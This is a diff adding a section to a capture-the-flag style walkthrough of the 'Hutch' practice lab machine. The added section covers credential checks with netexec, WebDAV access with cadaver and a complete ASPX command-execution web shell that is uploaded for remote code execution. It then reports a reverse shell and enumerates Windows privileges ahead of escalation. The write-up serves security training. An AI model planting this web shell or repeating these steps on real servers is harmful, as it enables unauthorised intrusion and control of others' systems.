@@ -1,4 +1,4 @@
-## First enumeration with nmap 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/369fa4ee-84a9-4a26-90fa-827c4480ec68)## First enumeration with nmap 
 
 ```shell
 # Nmap 7.94SVN scan initiated Tue Feb 27 15:20:28 2024 as: nmap -sC -sV -T4 -oN service.nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -Pn 192.168.154.122
@@ -968,4 +968,120 @@ cool we got clean usernames.
 cool we got a password and usernames. 
 
 ![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/537736eb-d93c-4f11-91f6-18838cf6e68c)
+
+we have access to smb, let's check if we can gain access to `winrm`. 
+
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Hutch]
+└─$ sudo nxc winrm 192.168.154.122 -u fmcsorley -p CrabSharkJellyfish192 --continue-on-success
+SMB         192.168.154.122 445    HUTCHDC          [*] Windows 10.0 Build 17763 (name:HUTCHDC) (domain:hutch.offsec)
+WINRM       192.168.154.122 5985   HUTCHDC          [-] hutch.offsec\fmcsorley:CrabSharkJellyfish192
+```
+we don't have access to `winrm`. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ee1a5c66-9378-4864-aab0-64a6b0bb2ea2)
+
+going back to the nmap scan, we can see a webdav server is running on port `80`. let's enumerate this. 
+
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Hutch]
+└─$ cadaver 192.168.154.122
+Authentication required for 192.168.154.122 on server `192.168.154.122':
+Username: fmcsorley
+Password: 
+dav:/> ls
+Listing collection `/': succeeded.
+Coll:   aspnet_client                          0  Nov  4  2020
+        iisstart.htm                         703  Nov  4  2020
+        iisstart.png                       99710  Nov  4  2020
+        index.aspx                          1241  Nov  4  2020
+dav:/>
+```
+using `cadaver` to access the webdav server by logging in using the creds we got earlier, we can see we are in the default root dir of the webserver. let's put in an aspx web shell. 
+
+```as
+<%@ Page Language="C#" Debug="true" Trace="false" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<script Language="c#" runat="server">
+void Page_Load(object sender, EventArgs e)
+{
+}
+string ExcuteCmd(string arg)
+{
+ProcessStartInfo psi = new ProcessStartInfo();
+psi.FileName = "cmd.exe";
+psi.Arguments = "/c "+arg;
+psi.RedirectStandardOutput = true;
+psi.UseShellExecute = false;
+Process p = Process.Start(psi);
+StreamReader stmrdr = p.StandardOutput;
+string s = stmrdr.ReadToEnd();
+stmrdr.Close();
+return s;
+}
+void cmdExe_Click(object sender, System.EventArgs e)
+{
+Response.Write("<pre>");
+Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
+Response.Write("</pre>");
+}
+</script>
+<HTML>
+<HEAD>
+<title>awen asp.net webshell</title>
+</HEAD>
+<body >
+<form id="cmd" method="post" runat="server">
+<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
+<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
+<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
+</form>
+</body>
+</HTML>
+
+<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
+<!--    http://michaeldaw.org   04/2007    -->
+```
+aspx web shell. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ce33a95e-ef46-4299-b6f8-35b2c708d0b8)
+
+uploaded the webshell. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/da8abcc5-8291-487a-86d0-a95beccb8ebd)
+
+we can access the shell and also trigger an RCE. let's spawn reverse shell 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ab350cfb-1133-43e2-ac27-face0d1257ff)
+
+we got a reverse shell.
+
+
+
+## Privilege Escalation 
+
+
+```powershell
+PS C:\windows\system32\inetsrv> whoami 
+iis apppool\defaultapppool
+PS C:\windows\system32\inetsrv> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+PS C:\windows\system32\inetsrv>
+```
+checking user privs, we can see `SeImpersonatePrivilege` is enabled. 
+
 
